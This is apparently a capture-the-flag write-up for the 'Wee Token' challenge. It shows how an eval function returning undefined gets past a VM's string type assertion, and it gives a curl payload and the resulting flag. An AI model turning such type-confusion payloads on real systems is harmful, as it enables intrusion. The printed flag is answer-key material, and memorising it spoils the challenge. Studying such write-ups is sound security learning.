# Wee Token

> Solves: 54

> We _need_ to make sure strings in Wee are also strings in our runtime. Apparently attackers got around this and actively exploit us! We do not know how. Calling out to haxxor1, brocrowd, kobold.io,...: if anybody can show us how they did it, please, please please submit us the token the VM will produce. We added the function assert_string(str: string) for your convenience. You might get rich - or not. It depends a bit on how we feel like and if you reach our technical support or just 1st level. Anyway: this is a call to arms and a desperate request, that, we think, is usually called Bugs-Bunny-Program... or something? Happy hacking.
> http://35.207.132.47/

> Difficulty estimate: Easy

This is one of the [Wee](../Wee) challenges.

It's the last of 5 similar challenges revolving around breaking assertions
inside the interpreter source.

## Analysis

Unexpectedly cocky definition:

```js
externals.addFunction(
    // Wee is statically typed. Finding a way to confuse the VM is impossible.
    "assert_string",
    [{name: "str", type: compiler.StringType}], compiler.StringType,
    false,
    (str: string) => typeof str == "string" ? "WEE is statically typed. Sorry, confusing the VM is impossible."
        : flags.WEE_TOKEN
)
```

Looks like to break it we are going to have to find some way to fool the type
checker or a function which doesn't always return strings.

We can find a couple interesting functions in the same file:

```js
externals.addFunction(
    "eval",
    [{name: "expr", type: compiler.StringType}], compiler.StringType,
    true,
    (expr: string) => {
        return wee_eval(expr)
    }
)
```

```js
function wee_eval(expr: string): AsyncPromise<string> {
    let asyncResult: AsyncPromise<string> = {
        completed: false,
        value: null,
        stopVirtualMachine: false
    }
    eval_in_chrome(expr).then((res) => {
        //console.log("Result ", expr, res)
        asyncResult.value = res;
        asyncResult.completed = true
    }).catch((err) => {
        console.log("Unexpectged error in eval", expr, err)
        asyncResult.value = "" + err;
        asyncResult.completed = true
    })
    return asyncResult
}
```

```js
async function eval_in_chrome(script, ...args): Promise<string> {
    //const browser = await puppeteer.launch({args: ["--no-sandbox"]})
    try {
        //console.log("running", script, ...args)
        //const browser = await puppeteer.launch({args: ["--no-sandbox"]})
        //const page = await browser.newPage()
        //await page.goto(`file:///${__dirname}/pypyjs.html`)
        //const response = await page.goto(`file:///${__dirname}/pypyjs.html`)
        //console.log(response) Too slow :/
        const page = await pagePromise
        //console.log("Goiong on evaling", script, args)
        const result = await page.evaluate(script, ...args)
        //await page.close()
        //console.log("closed. returning.", result)
        return result
    } catch (e) {
        //console.log("An eval error occurred: ", e)
        return "" + e.message
    }
}
```

Looks like this evaluates JavaScript and if no error occurs returns what has
been evaluated. Perfect!

## Solution

Some good old `undefined` action:

```
liquid$> curl -X POST http://35.207.132.47/wee/run -d '{ "code": "alert(assert_string(eval(\'\')))" }'
{"code":"alert(assert_string(eval('')))","result":"35C3_WEE_IS_TINY_AND_SO_CONFU5ED\n"}
```
